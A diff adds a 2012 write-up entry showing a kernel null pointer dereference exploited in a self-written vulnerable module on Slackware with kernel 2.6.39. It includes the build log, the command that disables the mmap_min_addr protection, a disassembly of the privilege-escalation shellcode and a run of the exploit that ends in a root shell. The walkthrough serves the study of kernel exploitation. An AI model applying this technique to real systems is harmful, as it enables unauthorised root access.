@@ -1,3 +1,83 @@
+Shawn the R0ck - Nov 21, 2012
+
+I wrote a example about null pointer dereference which is happenning
+in kernel land. Remember that one paper was released in 6xth issue of
+Phrack ezine mentioned about user land is harder to exploit, so a lot
+of hackers begun to searching/roaming in the kernel land. More wild
+place, let's into the wild!
+
+--------------------------------------------------------------------
+john@sl13:~/null_bug$ ls
+Makefile*  exp.c*  null_bug.c*  shellcode.s*
+
+john@sl13:~/null_bug$ make
+gcc -o exp exp.c
+gcc -o shellcode shellcode.s -nostdlib -Ttext=0
+/usr/lib/gcc/i486-slackware-linux/4.5.2/../../../../i486-slackware-linux/bin/ld: warning: cannot find entry symbol _start; defaulting to 0000000000000000
+make -C /lib/modules/2.6.39-smp/build/ M=/home/john/null_bug modules
+make[1]: Entering directory `/usr/src/linux-2.6.39'
+  CC [M]  /home/john/null_bug/null_bug.o
+/home/john/null_bug/null_bug.c: In function 'test_write':
+/home/john/null_bug/null_bug.c:25:19: warning: unused variable 'nb'
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /home/john/null_bug/null_bug.mod.o
+  LD [M]  /home/john/null_bug/null_bug.ko
+make[1]: Leaving directory `/usr/src/linux-2.6.39'
+
+# Use root load the kernel module:
+john@sl13:~/null_bug$ su                                  
+Password: 
+
+root@sl13:/home/john/null_bug# insmod null_bug.ko 
+root@sl13:/home/john/null_bug# mount -t debugfs none /sys/kernel/debug/
+
+# For some reasons, you need to set the kernel allow the low address
+can be mapped
+
+ root@sl13:/home/john/null_bug# echo 0 >
+/proc/sys/vm/mmap_min_addr root@sl13:/home/john/null_bug# exit exit
+
+# Examine the current user id:
+john@sl13:~/null_bug$ id
+uid=1000(john) gid=100(users) groups=100(users)
+
+# Get the shellcode
+john@sl13:~/null_bug$ objdump -d shellcode
+
+shellcode:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	31 c0                	xor    %eax,%eax
+   2:	e8 e9 56 06 c1       	call   c10656f0 <_end+0xc10646e0>
+   7:	e8 e4 54 06 c1       	call   c10654f0 <_end+0xc10644e0>
+   c:	c3                   	ret    
+
+# Run the exploit
+john@sl13:~/null_bug$ ./exp
+sh-4.1# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.1# 
+--------------------------------------------------------------------
+
+See, we did it! The exploit works. I tested it on Slackware 13 with
+kernel 2.6.39. There are plenty of real life null pointer dereference
+bugs in the kernel land. The only thing you need to do is make your
+hands dirty in the wild land.
+
+May L0rd's hacking spirit guide us!!!
+
+BTW: Thanks to Keegan McAllister's and nelhage's articles:
+
+http://mainisusuallyafunction.blogspot.com/2012/01/writing-kernel-exploits.html
+https://blogs.oracle.com/ksplice/entry/much_ado_about_null_exploiting1
+
+
+
+
 Shawn the R0ck - Nov 12, 2012
 
 null_test.c is a userspace example in NULL POINTER DEREFERENCE. It
